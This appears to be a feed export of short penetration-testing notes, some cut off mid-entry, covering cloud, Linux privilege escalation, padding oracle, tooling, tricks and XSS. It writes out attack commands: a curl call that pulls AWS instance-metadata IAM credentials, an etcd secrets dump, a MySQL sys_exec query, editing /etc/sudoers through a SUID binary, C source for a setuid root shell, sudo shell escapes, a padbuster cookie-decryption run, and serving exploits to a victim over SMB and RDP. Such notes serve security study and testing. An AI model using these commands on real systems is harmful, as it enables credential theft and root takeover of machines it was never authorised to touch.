item.title: Cloud Security
item.description: Grab IAM Role Keys - AWS curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ Security Audit Tools ScoutSuite All-In-One Wiki for Cloud Penetration Testing Source: https://www.peerlyst.com/posts/all-in-one-wiki-for-cloud-penetration-testing-nitesh-malviya Links and Resources for Cloud basics Introduction to Cloud Computing - https://www.gracefulsecurity.com/an-introduction-to-cloud-computing/ SANS - https://pen-testing.sans.org/blog/2012/07/05/pen-testing-in-the-cloud AWS Official Guide for permission and Penetration Testing - https://aws.amazon.com/security/penetration-testing/ Links and Resources for AWS Pentesting https://www.gracefulsecurity.com/an-introduction-to-penetration-testing-aws/ https://www.provensec.com/penetration-testing-aws-s3-bucket/ Rhinosecuritylabs links - https://rhinosecuritylabs.com/blog/?category=aws - check all the links.

item.title: Linux Privilege Escalation
item.description: MySQL running as ROOT If you have password, log in, issue that query, it will return exit code of command. select sys_exec('whoami'); Find SUID programs and abuse them find / -user root -perm -4000 -print 2>/dev/null student@attack:/$ /usr/bin/vim.tiny /etc/sudoers SUID binary to compile and hijack PATH #include <stdio.h>#include <stdlib.h>#include <sys/types.h>#include <unistd.h> int main() { setuid(0); system("/bin/bash"); return 0; } Using System Tools # sudo find / -exec /bin/sh -I \; # sudo vi // inside :shell # sudo more/less // inside :bash # sudo python -c "import pty; pty.

item.title: Padding Oracle Attack
item.description: Performing Padding Oracle Attack using padBuster. Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profile.php vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw== -cookies "secret=vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw==; PHPSESSID=g2ea7aeakie1fvlff44rv456p2" 8 +-------------------------------------------+ | PadBuster - v0.3.3 | | Brian Holyfield - Gotham Digital Science | | labs@gdssecurity.com | +-------------------------------------------+ INFO: The original request returned the following [+] Status: 200 [+] Location: N/A [+] Content Length: 3854 INFO: Starting PadBuster Decrypt Mode *** Starting Block 1 of 4 *** INFO: No error string was provided.

item.title: Static Code Analysis
item.description: Performing static code analysis in order to find weak points. Articles great article from @bl4de on that subject another article from AppSecco Tools relative-url-extractor waybackurls trufflehog eslint + security rules (node for example or angular) linkfinder nodejsscan retire.js awesome-static-analysis

item.title: Tricks
item.description: Everything that doesn’t fit to one category. rdesktop – sharing directory between attacker/victim, works with pivoting Recently discovered very nice way of sharing files for Windows machines with RDP, local dir exploits/ in current location will be available as share. rdesktop -uname -peasypassword -r disk:share=exploits/ 10.2.2.1 etcd - fetch keys, secrets, etc. curl http://:2379/v2/keys/?recursive=true share exploits over samba to windows machine # git-clone recent version! bastard/custom - [master●] » impacket-smbserver hacker $( pwd ) Impacket v0.

item.title: XSS
item.description: Everything related to XSS, tools, links, payloads, etc. Tools ezXSS - self hosted dashboard and server for your payloads bXSS - blind XSS application, had not played with it yet Sites XSS Payloads - site with JavaScript code that can actually hurt, keyloggers, data stealing etc. XSS Hunter - site that helps you by serving prepared scripts and generates some basic payloads, helps finding blind injections.
